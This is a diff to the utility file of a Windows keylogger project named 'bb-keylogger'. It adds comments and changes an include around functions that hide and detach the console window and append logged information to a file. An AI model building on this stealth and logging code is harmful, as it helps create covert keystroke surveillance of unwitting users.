@@ -22,7 +22,7 @@
 *
 * DESCRIPTION
 * -----------------------------------------------------------------------------
-* File containing all the functions used to log the keystrokes.
+* File containing all the utils functions used by the program.
 * -----------------------------------------------------------------------------
 */
 
@@ -33,13 +33,18 @@
 #include <windows.h>
 
 //---------------------------------------------------------- PERSONNAL INCLUDES
-#include "includes/bb-keylogger.h"
+#include "includes/bb-keylogger-utils.h"
 #include "includes/bb-keylogger-keyboard.h"
 #include "includes/bb-keylogger-system.h"
 #include "includes/global.h"
 
 //------------------------------------------------------------------- FUNCTIONS
 
+/*
+* Function that initializes the program :
+*  - hides the Windows console
+*  - detaches the program from the console
+*/
 void initialize_program(  )
 {
 	HWND hWnd = ( HWND ) GetConsoleWindow( );
@@ -49,6 +54,10 @@ void initialize_program(  )
 	FreeConsole( );
 }
 
+/*
+* Function that log informations passed through unamed parameters.
+* The informations are saved in the log file in the specified format.
+*/
 void log_infos( FILE * log_file, const char * format, ... )
 {
 	// Get the unamed parameters
@@ -60,6 +69,11 @@ void log_infos( FILE * log_file, const char * format, ... )
 	va_end( arg_ptr );
 }
 
+/*
+* Function that opens a file a checks if the opening succeeded :
+*  - if the opening failed, the programm is killed
+*  - if the opening succeeded, the file pointer is returned
+*/
 FILE * open_file( char * log_file_name )
 {
 	FILE * log_file = fopen( log_file_name, "a" );
